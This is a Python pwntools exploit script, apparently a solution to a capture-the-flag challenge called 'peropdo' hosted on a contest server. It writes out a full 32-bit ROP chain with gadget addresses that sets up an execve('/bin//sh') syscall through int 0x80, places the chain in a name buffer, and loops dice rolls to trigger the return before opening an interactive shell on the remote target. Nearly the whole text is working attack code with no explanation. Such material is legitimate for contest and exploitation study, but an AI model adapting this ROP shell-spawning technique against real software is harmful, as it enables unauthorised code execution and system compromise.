# ret @ 24th dice
from pwn import *

NAME_BUF = 0x080ECFC0

# p = process('./peropdo')
p = remote('peropdo_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me', 80)

call_count = 21442

rop_chain = '\x57\x16\x92\xc7'  # ebx
rop_chain += '/bin'  # esi
rop_chain += '//sh'  # edi
rop_chain += p32(0)  # ebp

# 0x08049a43: xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret  ;
rop_chain += p32(0x08049a43)
rop_chain += p32(NAME_BUF + 4)  # ebx
rop_chain += '3333'  # esi
rop_chain += '4444'  # edi
rop_chain += '5555'  # ebp

# pop eax ; ret  ;
rop_chain += p32(0x80e3525)
rop_chain += p32(0xe)  # eax

# dec eax
rop_chain += p32(0x8064823)
rop_chain += p32(0x8064823)
rop_chain += p32(0x8064823)

# pop ecx ; ret  ;
rop_chain += p32(0x080e5ee1)
rop_chain += p32(NAME_BUF + 4*20)

# pop edx ; ret  ;
rop_chain += p32(0x0806f2fa)
rop_chain += p32(0)

# int 0x80
rop_chain += p32(0x0806ce25)

rop_chain += p32(0)
rop_chain += p32(NAME_BUF + 10)


whitespaces = ' \t\n\v\f\r'
for c in whitespaces:
    if c in rop_chain:
        log.info('ROP chain should not contain %02x' % ord(c))
        exit(-1)


p.sendlineafter('What is your name?\n', rop_chain)


def roll_dice(count, answer='y'):
    p.sendlineafter('like to roll?\n', str(count))
    p.sendlineafter('again? ', answer)

g = log.progress('Remain: ')
while call_count > 24:
    roll_num = min(call_count-24, 24)
    roll_dice(roll_num)
    call_count -= roll_num
    g.status(str(call_count))
g.success('Complete')

roll_dice(24, 'n')

p.interactive()
